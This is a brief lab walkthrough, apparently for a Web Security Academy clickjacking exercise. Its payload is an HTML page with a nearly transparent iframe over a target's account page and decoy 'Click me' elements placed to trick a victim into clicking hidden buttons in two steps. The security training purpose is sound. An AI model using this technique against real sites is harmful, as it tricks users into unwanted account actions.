1. Log in;
2. Access the exploit server and paste the following payload

```html

<style>
	iframe {
		position:relative;
		width: 500px;
		height: 700px;
		opacity: 0.00001;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top: 330px;
		left: 50px;
		z-index: 1;
	}
   .secondClick {
		top:285px;
		left:225px;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0a39004d04ec2ab683eef060005e0072.web-security-academy.net/my-account"></iframe>


```